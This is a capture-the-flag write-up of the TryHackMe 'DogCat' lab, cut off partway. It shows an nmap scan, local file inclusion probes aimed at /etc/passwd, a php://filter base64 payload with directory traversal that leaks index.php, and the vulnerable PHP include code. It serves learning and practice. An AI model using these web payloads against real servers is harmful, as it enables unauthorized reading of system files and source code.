---
title: TryHackMe - DogCat
description: My writeup on DogCat box.
categories:
 - tryhackme
tags: tryhackme
---

![](https://i.imgur.com/otcW2ZH.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **DogCat**  |
| Difficulty :  | **Medium**             |
| Play :    | [DogCat](https://tryhackme.com/room/dogcat){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.157.103
$ nmap -sC -sV -oN nmap/dogcat.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-30 22:20 EET
Nmap scan report for 10.10.157.103 (10.10.157.103)
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```

Once we visit the website, we can see 2 buttons `A dog` & `A cat`.

![](https://i.imgur.com/DuBz9Wy.png)

We click a random one and we can see the URL goes like that `?view=dog`, that's probably LFI. LFI (Local File Inclusion) allow us to read files on the victim machine. The most common way to test that is by using the `/etc/passwd` file. Let's try it.

`http://$ip/?view=/etc/passwd` -> This gives an error `Sorry, only dogs or cats are allowed.` Let's try to add dog or cat in the URL.

`http://$ip/?view=dog/etc/passwd` -> This gives an error `Warning: include(dog/etc/passwd.php)` We can see it adds `.php` in all files, we can't ready `/etc/passwd` but we can read the `index.php` source code! When we have LFI we can’t read php files because they get executed by the webserver. So we will do a trick to bypass that using base64.

Also here we have to apply a directory traversal attack `../`

```
$ curl -s "http://$ip/?view=php://filter/convert.base64-encode/resource=dog../../index"
PCFET0NUWVBF..data...go8L2h0bWw+Cg==
```

After we decode it we have the source code:

```php
function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
      }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
```

Now we have to do source code analysis. The most important thing in the source code is this variable:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
```
